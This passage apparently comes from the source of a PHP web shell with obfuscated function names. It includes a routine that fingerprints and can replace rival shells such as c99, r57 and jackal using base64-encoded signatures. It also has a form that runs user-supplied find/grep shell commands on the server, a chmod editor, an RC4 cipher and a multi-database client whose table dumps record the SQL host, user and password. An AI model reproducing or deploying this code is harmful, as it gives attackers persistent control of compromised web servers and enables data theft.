            "Locus" => @explode("||", @base64_decode("YmJlcnIoKXx8Yzk5ZnNlYXJjaCgkZCl8fGM5OWZ0cGJydXRlY2hlY2soJGhvc3QsJHBvcnQsJHRpbWVvdXQsJGxvZ2luLCRwYXNzLCRzaCwkZnFiX29ubHl3aXRoc2gpfHxjOTlnZXRzb3VyY2UoJGZuKXx8Yzk5c2hleGl0KCl8fGM5OV9idWZmX3ByZXBhcmUoKXx8Yzk5X3Nlc3NfcHV0KCRkYXRhKXx8Y2YoJGZuYW1lLCR0ZXh0KXx8Y2YoJGZuYW1lLCR0ZXh0KXx8Y2ZiKCRmbmFtZSwkdGV4dCl8fGNoZWNrcHJveHlob3N0KCl8fGRpc3BsYXlzZWNpbmZvKCRuYW1lLCR2YWx1ZSl8fGRvc3lheWljZWsoJGxpbmssJGZpbGUpfHxFTlVNRVJBVEUoKXx8ZXJyKCRuLCR0eHQ9JycpfHxlcnIoKXx8ZXgoJGNmZSl8fGV4KCRjZmUpfHxmc19jb3B5X2RpcigkZCwkdCl8fGZzX2NvcHlfb2JqKCRkLCR0KXx8ZnNfbW92ZV9kaXIoJGQsJHQpfHxmc19tb3ZlX29iaigkZCwkdCl8fGZzX3JtZGlyKCRkKXx8ZnNfcm1vYmooJG8pfHxnZXRtaWNyb3RpbWUoKXx8bHNfcmV2ZXJzZV9hbGwoKXx8bHNfc2V0Y2hlY2tib3hhbGwoc3RhdHVzKXx8bXlzaGVsbGV4ZWMoJGNtZCl8fG15c2hlbGxleGVjKCRjbWQpfHxteXNoZWxsZXhlYygkY29tbWFuZCl8fG15c3FsX2NyZWF0ZV9kYigkZGIsJHNvY2s9IiIpfHxteXNxbF9kdW1wKCRzZXQpfHxteXNxbF9mZXRjaF9hbGwoJHF1ZXJ5LCRzb2NrKXx8bXlzcWxfcXVlcnlfZm9ybSgpfHxteXNxbF9xdWVyeV9wYXJzZSgkcXVlcnkpfHxteXNxbF9zbWFydGVycm9yKCR0eXBlLCRzb2NrKXx8b25waHBzaHV0ZG93bigpfHxwYXJzZXNvcnQoJHNvcnQpfHxwYXJzZV9wZXJtcygkbW9kZSl8fHBvc2l4X2dldGdyZ2lkKCRnaWQpfHxwb3NpeF9nZXRwd3VpZCgkdWlkKXx8cG9zaXhfa2lsbCgkZ2lkKXx8cnNnX2dsb2IoKXx8cnNnX3JlYWQoKXx8c2VsZlVSTCgpfHxzZXRfZW5jb2Rlcl9pbnB1dCh0ZXh0KXx8c3RyMm1pbmkoJGNvbnRlbnQsJGxlbil8fHN0cmlwcygmJGFyciwkaz0iIil8fHRhYnNvcnQoJGEsJGIpfHx2aWV3X3Blcm1zKCRtb2RlKXx8dmlld19wZXJtc19jb2xvcigkbyl8fHZpZXdfc2l6ZSgkc2l6ZSl8fHdoaWNoKCRwcil8fHdoaWNoKCRwcik=")),
            "jackal" => @explode("||", @base64_decode("YXV0aGNyYWNrZVIoKXx8YnJzaGVsTCgpfHxjYWxDKCl8fGNoZWNrc210UCgkaG9zdCwkdGltZW91dCl8fGNoZWNrc3VNKCRmaWxlKXx8Y2hlY2t0aGlzcG9yVCgkaXAsJHBvcnQsJHRpbWVvdXQsJHR5cGU9MCl8fGNoZWNrX3VyTCgkdXJsLCRtZXRob2QsJHNlYXJjaCwkdGltZW91dCl8fGNyYWNrZVIoKXx8ZGljbWFrZVIoKXx8ZG93bmxvYWRpVCgkZ2V0LCRwdXQpfHxlZGl0b1IoJGZpbGUpfHxmaWxlbWFuYWdlcigpfHxmbHVzaGVSKCl8fGZvcm1jcmFja2VSKCl8fGZ0cGNyYWNrZVIoKXx8Z2V0X3N3X25hbUUoJGhvc3QsJHRpbWVvdXQpfHxoYXNoY3JhY2tlUigpfHxoZXh2aWVXKCl8fGhsaW5LKCRzdHI9IiIpfHxpbWFwY3JhY2tlUigpfHxpbWFwbG9naU4oJGhvc3QsJHVzZXJuYW1lLCRwYXNzd29yZCl8fGxpc3RkaVIoJGN3ZCwkdGFzayl8fGxvZ291VCgpfHxtYWlsZVIoKXx8bXlzcWxjbGllblQoKXx8b3BlbmlUKCRuYW1lKXx8cG9wM2NyYWNrZVIoKXx8cG9wM2xvZ2lOKCRzZXJ2ZXIsJHVzZXIsJHBhc3MpfHxwcjB4eSgpfHxzYWZlbW9kRSgpfHxzaGVsTCgkY29tbWFuZCl8fHNob3dpbWFnRSgkaW1nKXx8c2hvd3NpekUoJHNpemUpfHxzbXRwY3JhY2tlUigpfHxzbXRwbG9naU4oJGFkZHIsJHVzZXIsJHBhc3MsJHRpbWVvdXQpfHxzbm1wY2hlY0soJGlwLCRjb20sJHRpbWVvdXQpfHxzbm1wY3JhY2tlUigpfHxzcWxjcmFja2VSKCl8fHN0cl9yZXBlYXQoJHN0ciwkYyl8fHN5c2luZk8oKXx8d2Vic2hlbEwoKXx8d2hlcmVpc3RtUCgpfHx3aG9pUygp")),
            "SyRiAn" => @explode("||", @base64_decode("QWJvdXQoKXx8Y2hlY2tmdW5jdGlvTigkZnVuYyl8fGNvbXNoZWxMKCRjb21tYW5kLCR3cyl8fGNwYW5lbF9jaGVjaygkaG9zdCwkdXNlciwkcGFzcywkdGltZW91dCl8fENTUygkc2hlbGxDb2xvcil8fEN1cmwoKXx8Y3VycmVudEZpbGVOYW1lKCl8fERlY3J5cHRDb25maWcoKXx8RGlzYWJsZUZ1bmN0aW9ucygpfHxFeGUoJGNvbW1hbmQpfHxmZmlzaGVsTCgkY29tbWFuZCl8fGZvb3RlcigpfHxmdHBfY2hlY2soJGhvc3QsJHVzZXIsJHBhc3MsJHRpbWVvdXQpfHxHZW5lcmF0ZUZpbGUoJG5hbWUsJGNvbnRlbnQpfHxHZXRSZWFsSVAoKXx8Z2V0X3Bhc3MoJGxpbmspfHxHemlwKCl8fEhhcmRTaXplKCRzaXplKXx8aW5wdXQoJHR5cGUsJG5hbWUsJHZhbHVlLCRzaXplKXx8TG9nb3V0KCl8fG1hZ2ljUW91dHMoKXx8TVNRTCgpfHxNc1NRTCgpfHxNeVNRTDIoKXx8TXlzcWxJKCl8fG9wZW5CYXNlRGlyKCl8fE9yYWNsZSgpfHxwZXJsc2hlbEwoJGNvbW1hbmQpfHxQb3N0Z3JlU1FMKCl8fHJlYWRfZGlyKCRwYXRoLCR1c2VybmFtZSl8fFJlZ2lzdGVyR2xvYmFscygpfHxyb290eHBMKCl8fFNhZmVNb2RlKCl8fFNlbGVjdENvbW1hbmQoJG9zKXx8c2hvd1VzZXJzKCl8fFNRbExpdGUoKXx8c3J2c2hlbEwoJGNvbW1hbmQpfHxzdHJfaGV4KCRzdHJpbmcpfHxTdWljaWRlKCl8fHR1bGlzKCRmaWxlLCR0ZXh0KXx8dXBkYXRlKCl8fHdoZXJlaXN0bVAoKXx8d2hpY2goJHByKXx8d2luc2hlbEwoJGNvbW1hbmQp")), );
    $content = z9o($file);
    if (!$content)
        return false;
    $cleanct = @preg_replace('/[\s\t\r\n\v]/', '', $content);
    foreach ($knownfunc as $type => $funcs) {
        $score = 0;
        $count = @count($funcs);
        $min = @round($count * 0.75);
        foreach ($funcs as $func) {
            if (@strstr($cleanct, $func))
                $score++;
        }
        $foundp = @round(($score / $count) * 100);
        if ($score >= $min) {
            if ($replace)
                $replaced = " : " . (z2w($file) ? z9y("290") : z9y("291"));
            return ($foundp == 100 ? $type . $replaced : $type . " (" . $foundp . "%)" . $replaced);
        }
    }
    if ($possible) {
        if ((@preg_match('/' . @base64_decode("KHN5c3RlbXxwYXNzdGhydXxzaGVsbF9leGVjfHBvcGVufHByb2Nfb3BlbikuezAsMTB9") .
            '/i', $content) && @preg_match('/' . @base64_decode("YmFja19jb25uZWN0fGJhY2tkb29yfHI1N3xQSFBKYWNrYWx8UGhwU3B5fEdpWHxGeDI5U2hlTEx8dzRjazFuZ3xtaWx3MHJtfFBocFNoZWxsfGsxcjR8RmVlTENvTXp8RmFUYUxpc1RpQ3p8VmVfY0VOeFNoZWxsfFVuaXhPbnxDOTltYWRTaGVsbHxTcGFtZm9yZHp8TG9jdXM3c3xjMTAwfGM5OXx4MjMwMHxjZ2l0ZWxuZXR8d2ViYWRtaW58U1RVTlNIRUxMfFByIXY4fFBIUFNoZWxsfEthTWVMZU9ufFM0VHxvUmJ8dHJ5YWd8bm9leGVjc2hlbGx8XC9ldGNcL3Bhc3N3ZHxyZXZlbmdhbnM=") .
            '/', $content)) || @preg_match('/' . @base64_decode("ZXZhbC57MCwxMH1iYXNlNjRfZGVjb2Rl") .
            '/i', $content)) {
            if ($replace)
                $replaced = (z2w($file) ? " : " . z9y("290") : " : " . z9y("291"));
            return "Possible backdoor" . $replaced;
        }
    }
    return false;
}
function z0s($i, $t, $h, $a)
{
    $r = z10w(z7u(z6l('<form method="POST" action="?" onsubmit="return chkfrm(\'' .
        $i . '\',\'' . $t . '\');">' . '<input type="hidden" name="' . $t . '" id="' . $t .
        '">' . $h . z8m(z9y("63"), 'chkall(\'' . $i . '\',true);', '7') . z8m(z9y("64"),
        'chkall(\'' . $i . '\',false);', '7') . z8m(z9y("65"), 'invall(\'' . $i . '\');',
        '7') . z3m('action', $a, '4') . z8b(z9y("77"), '7') . '</form>', '11')), '2');
    return "<script type=\"text/javascript\">document.write('" . @str_replace("'", "\\'",
        @str_replace("\n", "", $r)) . "');</script>";
}
function z4n($f, $i, $id = '')
{
    return '<script>document.write(\'<input type="checkbox" id="' . $id .
        'chk" name="' . $i . '" value="' . $f . '" onclick="changetr(this.id.replace(\\\'chk\\\',\\\'\\\'), this.checked);" style="vertical-align: middle;">\');</script>';
}
function z1z()
{
    return "<script type=\"text/javascript\">function fnc_replace(idT,idA,idB){ var strT=document.getElementById(idT).value; var strA=document.getElementById(idA).value; var strB=document.getElementById(idB).value; if(strA !='' && strT.indexOf(strA)!=-1){ var repRegex=new RegExp(strA.escR(), 'g'); document.getElementById(idT).value=strT.replace(repRegex, strB);};}; String.prototype.escR=function(){ var sChars=[ '$', '^', '*', '(', ')', '+', '[', ']', '{', '}', '\\\\', '|', '.', '?', '/' ]; var regex=new RegExp('(\\\\' + sChars.join('|\\\\') + ')', 'g'); return this.replace(regex, '\\\\$1');}</script>";
}
function z3b()
{
    return '<script type="text/javascript">
if(!document.getElementById){ if(document.all){ document.getElementById=function(){ if(typeof document.all[arguments[0]]!="undefined"){ return document.all[arguments[0]]; } else { return null; };};} else if(document.layers){ document.getElementById=function(){ if(typeof document[arguments[0]]!="undefined"){ return document[arguments[0]]; } else { return null; };};};}
function changecls(trid, newcls){ try { document.getElementById(trid).className = document.getElementById(trid).className.replace(/[a-zA-Z0-9]+/,newcls); } catch(err){} }
function changetr(trid, vbool){ if(vbool){ changecls(trid,"list3"); } else { if(trid.substr(0,3) == "tra"){ changecls(trid,"list1"); } else { changecls(trid,"list2");};};}
function chkfrm(inid, hid){ var inputs=document.getElementsByTagName("input");var ichk=[];for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ if(inputs[i].checked){ ichk.push(inputs[i].value);};};};if(ichk.length > 0){ document.getElementById(hid).value = ichk.join("\n"); return true; } else { return false;};}
function chkall(inid,vbool){ var inputs=document.getElementsByTagName("input");for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ inputs[i].checked = vbool; changetr(inputs[i].id.replace(\'chk\', \'\'), vbool); };};}
function invall(inid){ var inputs=document.getElementsByTagName("input");for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ if(inputs[i].checked == true){ inputs[i].checked = false; changetr(inputs[i].id.replace(\'chk\', \'\'), false); } else { inputs[i].checked = true; changetr(inputs[i].id.replace(\'chk\', \'\'), true); };};};}
</script>';
}
function z3d($var, $f)
{
    $val = '';
    if (!empty($f)) {
        $reg = '/\$' . $var . '\s*=\s*([\'"]{1})([^\1\s\t\r\n]+)\1\s*;/';
        if (@preg_match($reg, $f, $m)) {
            $val = $m[2];
            unset($m);
        }
    }
    unset($f);
    return $val;
}
function z2o($var, $f)
{
    $val = '';
    if (!empty($f)) {
        $reg = '/([\'"]{1})' . $var . '\1[\s\t\r\n]*=>[\s\t\r\n]*([\'"]{1})([^\2\s\t\r\n]+)\2/';
        if (@preg_match($reg, $f, $m)) {
            $val = $m[3];
            unset($m);
        }
    }
    unset($f);
    return $val;
}
function z2u($var, $f)
{
    $val = '';
    if (!empty($f)) {
        $reg = '/\[([\'"]{1})' . $var . '\1\][\s\t\r\n]*=[\s\t\r\n]*([\'"]{1})([^\2\s\t\r\n]+)\2/';
        if (@preg_match($reg, $f, $m)) {
            $val = $m[3];
            unset($m);
        }
    }
    unset($f);
    return $val;
}
function z1c($const, $f)
{
    $val = '';
    if (!empty($f)) {
        $reg = '/define\s*\(([\'"]{1})' . $const . '\1\s*,\s*([\'"]{1})([^\2\s\t\r\n]+)\2\s*\)\s*;/';
        if (@preg_match($reg, $f, $m)) {
            $val = $m[3];
            unset($m);
        }
    }
    unset($f);
    return $val;
}
function z4b($type, $var, $f)
{
    switch ($type) {
        case 'var':
            return z3d($var, $f);
            break;
        case 'const':
            return z1c($var, $f);
            break;
        case 'arrayvar1':
            return z2o($var, $f);
            break;
        case 'arrayvar2':
            return z2u($var, $f);
            break;
        default:
            return '';
    }
}
function z3k($s, $t = 0)
{
    $reg = '[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.(([0-9]{1,3})|([a-zA-Z]{2,3})|(aero|coop|info|museum|name))';
    if ($t)
        return @preg_match('/^' . $reg . '$/i', $s);
    $r = array();
    if (@preg_match_all('/' . $reg . '/i', $s, $m)) {
        foreach ($m[0] as $em)
            $r[] = $em;
    }
    return @array_unique($r);
}
function z0k($a, $s = " and", $f = array())
{
    if (!@is_array($a))
        $a = array();
    $r = "";
    foreach ($a as $k => $v) {
        $p = "";
        if (!@empty($f[$k]))
            $p .= $f[$k] . "(";
        $p .= "'" . addslashes($v) . "'";
        if (!@empty($f[$k]))
            $p .= ")";
        $r .= "`" . $k . "` = " . $p . $s;
    }
    $r = @substr($r, 0, @strlen($r) - @strlen($s));
    return $r;
}
function z0c($file, $global = 0, $dir = 0)
{
    $mode = @fileperms($file);
    if ($dir) {
        $arr = ($global ? array() : array("act", "d", "ctarget" => $file, "chmod_submit" =>
                "1"));
    } else {
        $arr = ($global ? array() : array("act", "d", "f", "ft" => "functions",
                "ctarget" => $file, "chmod_submit" => "1"));
    }
    if ($mode) {
        $perms = z9w($mode, 1);
        $o = @decoct($mode);
        if (@strlen($o) > 4)
            $o = @substr($o, -4);
        echo z3q(($dir ? z9y("123") : z9y("93")) . z9x() . z4y($file));
        echo z10w(z7u(z9c(z5x($arr, z10w(z5b() . z7u(z5t(z9y("94", '', 1)) . z9c(z5u("chmod_or",
            z9y("97"), "chmod_o[r]", "1", (($perms["o"]["r"]) ? 1 : '')) . z9x(5) . z5u("chmod_ow",
            z9y("98"), "chmod_o[w]", "1", (($perms["o"]["w"]) ? 1 : '')) . z9x(5) . z5u("chmod_ox",
            z9y("99"), "chmod_o[x]", "1", (($perms["o"]["x"]) ? 1 : ''))) . z9c(z9x())) .
            z7u(z5t(z9y("95", '', 1)) . z9c(z5u("chmod_gr", z9y("97"), "chmod_g[r]", "1", (($perms["g"]["r"]) ?
            1 : '')) . z9x(5) . z5u("chmod_gw", z9y("98"), "chmod_g[w]", "1", (($perms["g"]["w"]) ?
            1 : '')) . z9x(5) . z5u("chmod_gx", z9y("99"), "chmod_g[x]", "1", (($perms["g"]["x"]) ?
            1 : ''))) . z9c(z9x(5) . z8b("Chmod", "7"))) . z7u(z5t(z9y("96", '', 1)) . z9c(z5u
            ("chmod_wr", z9y("97"), "chmod_w[r]", "1", (($perms["w"]["r"]) ? 1 : '')) . z9x
            (5) . z5u("chmod_ww", z9y("98"), "chmod_w[w]", "1", (($perms["w"]["w"]) ? 1 : '')) .
            z9x(5) . z5u("chmod_wx", z9y("99"), "chmod_w[x]", "1", (($perms["w"]["x"]) ? 1 :
            ''))) . z9c(z9x())) . z5b(), "2"))) . z9c(z5x(array("act", "d", "f", "ft" =>
                "functions", "ctarget" => $file, "chmod_submit" => "1"), z10w(z7u(z5t(z9y("101")) .
            z9c(z5y("chmod_val", $o, "1") . z8b(z9y("100"), "7"))), "2")))));
    }
}
function z0h()
{
    global $found, $nix, $sh_exec, $sn, $sn_reg, $s_in, $st, $st_reg, $st_wwo, $st_cs,
        $st_not, $s_fd, $s_rec;
    echo z3q(z9y("142")) . z6s();
    $as_fd = array('1' => z9y("144"), '2' => z9y("145"), '' => z9y("146"));
    $a_rec = array('' => z9y("21"));
    for ($i = 0; $i < 10; $i++)
        $a_rec[($i + 1)] = ($i + 1) . " " . z9y("145");
    $a_rec['no'] = z9y("22");
    $a_paths = array('cwd' => 'cwd', 'system' => 'system', 'bin' => '(s)bin dirs',
            'etc' => '/etc');
    echo z5x(array('d', 'act' => 'search', 'ftarget' => '1'), z10w(z9d(z9c(z10w(z7u
        (z5t(z9y("143")) . z9c(z6u("sn", @htmlspecialchars($sn), '2') . z3m("s_fd", $as_fd,
        '1', '1') . z3m("s_rec", $a_rec, '1', '1') . z6o("submit", z9y("147"), '7') .
        ' ' . z5u('sn_reg', z9y("148"), 'sn_reg'))) . z7u(z5t(z9y("149")) . z9c(z6u("s_in",
        htmlspecialchars($s_in), "9")))) . z10w(z7u(z5t(z9y("150")) . z9c(z6u("st", @
        htmlspecialchars($st), "9"))) . z7u(z5t("") . z9c(z5u("st_reg", z9y("151"),
        "st_reg") . z9x("3") . z5u("st_wwo", z9y("152"), "st_wwo") . z9x("3") . z5u("st_cs",
        z9y("153"), "st_cs") . z9x("3") . z5u("st_not", z9y("154"), "st_not"))))))));
    echo z6s();
    if ($nix && $sh_exec) {
        echo z3q(z9y("155")) . z6s();
        global $findaliases, $unixfind, $find_text, $find_in_dir, $find_in_files, $find_defined,
            $spath, $lsman;
        if (!@isset($spath))
            $spath = 'cwd';
        $find_result = "";
        if (@isset($unixfind) && $unixfind == "1" && @isset($find_text) && !@empty($find_text) &&
            @isset($find_in_dir) && !@empty($find_in_dir) && @isset($find_in_files) && !@
            empty($find_in_files)) {
            $find_infiles = @array_unique(@explode(";", $find_in_files));
            foreach ($find_infiles as $find_in_file) {
                $find_result .= z9e('find "' . $find_in_dir . '" -name "' . $find_in_file .
                    '" -print0|xargs -0 grep -E "' . $find_text . '"', 0);
            }
        }
        echo z5x(array('d', 'act' => 'search', 'unixfind' => '1'), z10w(z7u(z5t(z9y("156")) .
            z9c(z6u("find_text", @htmlspecialchars($find_text), '0') . z8b(z9y("147"), '7'))) .
            z7u(z5t(z9y("149")) . z9c(z6u("find_in_dir", @htmlspecialchars($find_in_dir),
            "9"))) . z7u(z5t(z9y("157")) . z9c(z6u("find_in_files", @htmlspecialchars($find_in_files),
            "9")))));
        echo z5x(array('d', 'act' => 'search', 'unixfind' => '2'), z10w(z7u(z5t(z9y("158")) .
            z9c(z2k("find_defined", $findaliases, "0", '1') . z3m('spath', $a_paths, '1',
            '1') . z8b(z9y("147"), '7') . z5u("lsman", z9y("159"), 'lsman', '1')))));
        echo z6s();
        if (@isset($unixfind) && $unixfind == "2" && @isset($find_defined) && !@empty($find_defined)) {
            if ($spath == 'system') {
                $rep = '/';
            } elseif ($spath == 'etc') {
                $rep = '/etc';
            } elseif ($spath == 'bin') {
                $rep = '/bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin';
            } else {
                $rep = '"' . $find_in_dir . '"';
            }
            if (@isset($lsman) && $lsman) {
                $find_defined = @str_replace(' -ls', '', $find_defined);
            }
            $find_defined = @str_replace('%path%', $rep, $find_defined);
            $find_result = z9e($find_defined, 0);
        }
        if (!@empty($find_result)) {
            if (@isset($lsman) && $lsman) {
                global $ls_a, $act, $fullpath, $nolsmenu, $nohead;
                $tls_a = @explode("\n", $find_result);
                $ls_a = array();
                foreach ($tls_a as $ls) {
                    $ls = @trim($ls);
                    if (!@empty($ls) && !@in_array($ls, $ls_a))
                        $ls_a[] = $ls;
                }
                if (@count($ls_a) > 0) {
                    $act = "ls";
                    $fullpath = 1;
                    $nolsmenu = 1;
                    $nohead = 1;
                }
            } else {
                echo z10w(z9d(z6l(z5w('', '1', 1) . @htmlspecialchars($find_result) . z5q())),
                    '2') . z6s();
            }
        }
    }
}
function z6m()
{
    global $images;
    return (@is_array($images) ? $images : array());
}
class zrc4
{
    function zenc($pwd, $data, $ispwdHex = 0)
    {
        if ($ispwdHex)
            $pwd = @pack('H*', $pwd);
        $key[] = '';
        $box[] = '';
        $cipher = '';
        $pwd_length = @strlen($pwd);
        $data_length = @strlen($data);
        for ($i = 0; $i < 256; $i++) {
            $key[$i] = @ord($pwd[$i % $pwd_length]);
            $box[$i] = $i;
        }
        for ($j = $i = 0; $i < 256; $i++) {
            $j = ($j + $box[$i] + $key[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        for ($a = $j = $i = 0; $i < $data_length; $i++) {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $k = $box[(($box[$a] + $box[$j]) % 256)];
            $cipher .= @chr(@ord($data[$i]) ^ $k);
        }
        return $cipher;
    }
    function zdec($pwd, $data, $ispwdHex = 0)
    {
        return zrc4::zenc($pwd, $data, $ispwdHex);
    }
}
class my_sql
{
    var $host = 'localhost';
    var $port = '';
    var $user = '';
    var $pass = '';
    var $base = '';
    var $db = '';
    var $connection;
    var $res;
    var $error;
    var $rows;
    var $columns;
    var $num_rows;
    var $num_fields;
    var $dump;
    function connect()
    {
        switch ($this->db) {
            case 'MySQL':
                if (empty($this->port)) {
                    $this->port = '3306';
                }
                if (!@function_exists('mysql_connect'))
                    return 0;
                $this->connection = @mysql_connect($this->host . ':' . $this->port, $this->user,
                    $this->pass);
                if (is_resource($this->connection))
                    return 1;
                break;
            case 'MSSQL':
                if (empty($this->port)) {
                    $this->port = '1433';
                }
                if (!@function_exists('mssql_connect'))
                    return 0;
                $this->connection = @mssql_connect($this->host . ',' . $this->port, $this->user,
                    $this->pass);
                if ($this->connection)
                    return 1;
                break;
            case 'PostgreSQL':
                if (empty($this->port)) {
                    $this->port = '5432';
                }
                $str = "host='" . $this->host . "' port='" . $this->port . "' user='" . $this->
                    user . "' password='" . $this->pass . "' dbname='" . $this->base . "'";
                if (!@function_exists('pg_connect'))
                    return 0;
                $this->connection = @pg_connect($str);
                if (is_resource($this->connection))
                    return 1;
                break;
            case 'Oracle':
                if (!@function_exists('ocilogon'))
                    return 0;
                $this->connection = @ocilogon($this->user, $this->pass, $this->base);
                if (is_resource($this->connection))
                    return 1;
                break;
        }
        return 0;
    }
    function select_db()
    {
        switch ($this->db) {
            case 'MySQL':
                if (@mysql_select_db($this->base, $this->connection))
                    return 1;
                break;
            case 'MSSQL':
                if (@mssql_select_db($this->base, $this->connection))
                    return 1;
                break;
            case 'PostgreSQL':
                return 1;
                break;
            case 'Oracle':
                return 1;
                break;
        }
        return 0;
    }
    function list_dbs()
    {
        $tmplist = array();
        switch ($this->db) {
            case 'MySQL':
                $this->res = @mysql_list_dbs($this->connection);
                while ($tmprow = @mysql_fetch_object($this->res))
                    $tmplist[$tmprow->Database] = $tmprow->Database;
                break;
            case 'MSSQL':
                break;
            case 'PostgreSQL':
                break;
            case 'Oracle':
                break;
        }
        return $tmplist;
    }
    function query($query)
    {
        $this->res = $this->error = '';
        switch ($this->db) {
            case 'MySQL':
                if (false === ($this->res = @mysql_query('/*' . chr(0) . '*/' . $query, $this->
                    connection))) {
                    $this->error = @mysql_error($this->connection);
                    return 0;
                } else
                    if (is_resource($this->res)) {
                        return 1;
                    }
                return 2;
                break;
            case 'MSSQL':
                if (false === ($this->res = @mssql_query($query, $this->connection))) {
                    $this->error = 'Query error';
                    return 0;
                } else
                    if (@mssql_num_rows($this->res) > 0) {
                        return 1;
                    }
                return 2;
                break;
            case 'PostgreSQL':
                if (false === ($this->res = @pg_query($this->connection, $query))) {
                    $this->error = @pg_last_error($this->connection);
                    return 0;
                } else
                    if (@pg_num_rows($this->res) > 0) {
                        return 1;
                    }
                return 2;
                break;
            case 'Oracle':
                if (false === ($this->res = @ociparse($this->connection, $query))) {
                    $this->error = 'Query parse error';
                } else {
                    if (@ociexecute($this->res)) {
                        if (@ocirowcount($this->res) != 0)
                            return 2;
                        return 1;
                    }
                    $error = @ocierror();
                    $this->error = $error['message'];
                }
                break;
        }
        return 0;
    }
    function get_result()
    {
        $this->rows = array();
        $this->columns = array();
        $this->get_num_fields();
        $this->get_num_rows();
        switch ($this->db) {
            case 'MySQL':
                while (false !== ($this->rows[] = @mysql_fetch_assoc($this->res)))
                    ;
                if ($this->num_fields) {
                    $this->columns = @array_keys($this->rows[0]);
                    if (@count($this->columns) < 1)
                        $this->get_columns();
                    @mysql_free_result($this->res);
                    return 1;
                }
                @mysql_free_result($this->res);
                break;
            case 'MSSQL':
                while (false !== ($this->rows[] = @mssql_fetch_assoc($this->res)))
                    ;
                if ($this->num_fields) {
                    $this->columns = @array_keys($this->rows[0]);
                    if (@count($this->columns) < 1)
                        $this->get_columns();
                    @mssql_free_result($this->res);
                    return 1;
                }
                @mssql_free_result($this->res);
                break;
            case 'PostgreSQL':
                while (false !== ($this->rows[] = @pg_fetch_assoc($this->res)))
                    ;
                if ($this->num_fields) {
                    $this->columns = @array_keys($this->rows[0]);
                    if (@count($this->columns) < 1)
                        $this->get_columns();
                    @pg_free_result($this->res);
                    return 1;
                }
                @pg_free_result($this->res);
                break;
            case 'Oracle':
                while (false !== ($this->rows[] = @oci_fetch_assoc($this->res)))
                    ;
                if ($this->num_fields) {
                    $this->columns = @array_keys($this->rows[0]);
                    if (@count($this->columns) < 1)
                        $this->get_columns();
                    @ocifreestatement($this->res);
                    return 1;
                }
                @ocifreestatement($this->res);
                break;
        }
        return 0;
    }
    function get_num_rows()
    {
        $this->num_rows = 0;
        switch ($this->db) {
            case 'MySQL':
                $this->num_rows = @mysql_num_rows($this->res);
                break;
            case 'MSSQL':
                $this->num_rows = @mssql_num_rows($this->res);
                break;
            case 'PostgreSQL':
                $this->num_rows = @pg_num_rows($this->res);
                break;
            case 'Oracle':
                while (false !== (@oci_fetch_assoc($this->res)))
                    $this->num_rows++;
                break;
        }
    }
    function get_columns()
    {
        $this->columns = array();
        $this->get_num_fields();
        switch ($this->db) {
            case 'MySQL':
                for ($i = 0; $i < $this->num_fields; $i++) {
                    if (@mysql_field_name($this->res, $i) !== false)
                        $this->columns[] = @mysql_field_name($this->res, $i);
                }
                break;
            case 'MSSQL':
                for ($i = 0; $i < $this->num_fields; $i++) {
                    if (@mssql_field_name($this->res, $i) !== false)
                        $this->columns[] = @mssql_field_name($this->res, $i);
                }
                break;
            case 'PostgreSQL':
                for ($i = 0; $i < $this->num_fields; $i++) {
                    if (@pg_field_name($this->res, $i) !== false)
                        $this->columns[] = @pg_field_name($this->res, $i);
                }
                break;
            case 'Oracle':
                for ($i = 0; $i < $this->num_fields; $i++) {
                    if (@ocicolumnname($this->res, $i) !== false)
                        $this->columns[] = @ocicolumnname($this->res, $i);
                }
                break;
        }
    }
    function get_num_fields()
    {
        $this->num_fields = 0;
        switch ($this->db) {
            case 'MySQL':
                $this->num_fields = @mysql_num_fields($this->res);
                break;
            case 'MSSQL':
                $this->num_fields = @mssql_num_fields($this->res);
                break;
            case 'PostgreSQL':
                $this->num_fields = @pg_num_fields($this->res);
                break;
            case 'Oracle':
                $this->num_fields = @ocinumcols($this->res);
                break;
        }
    }
    function parse_fields($table)
    {
        if (!$this->query('SELECT * FROM `' . $table . '` LIMIT 0,1;'))
            return 0;
        return ($this->get_result() ? $this->num_fields : 0);
    }
    function count_rows($table)
    {
        $tmpcount = 0;
        switch ($this->db) {
            case 'MySQL':
                $this->query('SELECT COUNT(*) FROM `' . $table . '`;');
                if (@is_resource($this->res)) {
                    $tmp = @mysql_fetch_array($this->res);
                    $tmpcount = $tmp[0];
                }
                break;
            case 'MSSQL':
                break;
            case 'PostgreSQL':
                break;
            case 'Oracle':
                break;
        }
        return (@is_numeric($tmpcount) ? $tmpcount : 0);
    }
    function dump($table)
    {
        if (empty($table))
            return 0;
        $this->dump = array();
        $this->dump[0] = '##';
        $this->dump[1] = '## ----------------------------------------------- ';
        $this->dump[2] = '## Dump date : ' . @date("d/m/Y H:i:s");
        $this->dump[3] = '## PHP shell : ' . z8u();
        $this->dump[4] = '## ----------------------------------------------- ';
        $this->dump[5] = '## SQL host  : ' . $this->host . ':' . $this->port;
        $this->dump[6] = '## SQL user  : ' . $this->user;
        $this->dump[7] = '## SQL pass  : ' . $this->pass;
        $this->dump[8] = '## SQL db    : ' . $this->base;
        $this->dump[9] = '## SQL table : ' . $table;
        $this->dump[10] = '## ----------------------------------------------- ';
        switch ($this->db) {
            case 'MySQL':
                $this->dump[0] = '## MySQL dump';
                if ($this->query('/*' . chr(0) . '*/ SHOW CREATE TABLE `' . $table . '`') != 1)
                    return 0;
                if (!$this->get_result())
                    return 0;
                $this->dump[] = $this->rows[0]['Create Table'];
                $this->dump[] = '## ----------------------------------------------- ';
                if ($this->query('/*' . chr(0) . '*/ SELECT * FROM `' . $table . '`') != 1)
                    return 0;
                if (!$this->get_result())
                    return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @mysql_real_escape_string($v);
                    }
                    $this->dump[] = 'INSERT INTO `' . $table . '` (`' . @implode("`, `", $this->
                        columns) . '`) VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
